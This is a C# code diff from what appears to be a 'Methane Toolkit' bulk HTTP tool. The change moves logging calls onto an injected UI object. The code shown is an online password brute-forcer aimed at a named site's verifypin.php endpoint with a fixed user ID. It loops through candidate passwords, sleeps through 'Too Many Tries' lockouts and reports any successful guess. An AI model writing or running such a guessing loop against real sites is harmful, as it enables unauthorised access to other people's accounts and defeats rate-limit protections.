@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
-using static Methane.Toolkit.Common;
 using System.Text;
 using HtmlAgilityPack;
 using System.Net.Http;
@@ -13,6 +12,12 @@ namespace Methane.Toolkit
 {
     public class BulkGETPOST
     {
+        readonly UI UI;
+        public BulkGETPOST(UI ui)
+        {
+            UI = ui;
+        }
+
 
 
         string cookie = "";
@@ -20,17 +25,16 @@ namespace Methane.Toolkit
 
 
 
-
         public void Run()
         {
 
-            Log("");
-            Log("    . . . . . . . . . . . . . . . .  .  ");
-            Log("               Methane                  ");
-            Log("         Bulk HTTP GET POST             ");
-            Log("  Deigned for https://getlinks.info/love ");
-            Log("    . . . . . . . . . . . . . . . .  .  ");
-            Log("");
+            UI.Log("");
+            UI.Log("    . . . . . . . . . . . . . . . .  .  ");
+            UI.Log("               Methane                  ");
+            UI.Log("         Bulk HTTP GET POST             ");
+            UI.Log("  Deigned for https://getlinks.info/love ");
+            UI.Log("    . . . . . . . . . . . . . . . .  .  ");
+            UI.Log("");
 
 
 
@@ -42,20 +46,20 @@ namespace Methane.Toolkit
             }
             catch (Exception ex)
             {
-                LogError(ex, "Cannot read the Cookie file");
+                UI.LogError(ex, "Cannot read the Cookie file");
                 //return;
                 cookie = "no:cookie";
             }
 
 
-            Log(GetForm("https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd=1111"));
+            UI.Log(GetForm("https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd=1111"));
 
 
             for (int i = 0; i < 99; i++)
             {
                 if (FoundPass)
                 {
-                    Log("Found it \n \n " + result);
+                    UI.Log("Found it \n \n " + result);
                     return;
                 }
 
@@ -87,12 +91,12 @@ namespace Methane.Toolkit
 
                 if (resp.Contains("Incorrect Password"))
                 {
-                    Log($"Pass {pass} is wrong");
+                    UI.Log($"Pass {pass} is wrong");
                 }
                 else if (resp.Contains("Too Many Tries"))
                 {
 
-                    Log($"Too Many Tries {pass}");
+                    UI.Log($"Too Many Tries {pass}");
                     //runningThreads--;
                     //return;
                     System.Threading.Thread.Sleep(1000);
@@ -101,7 +105,7 @@ namespace Methane.Toolkit
                 else
                 {
                     string l = $"Positive response {pass} \n {resp} \n \n";
-                    Log(l);
+                    UI.Log(l);
                     FoundPass = true;
                     result = l;
                     runningThreads--;
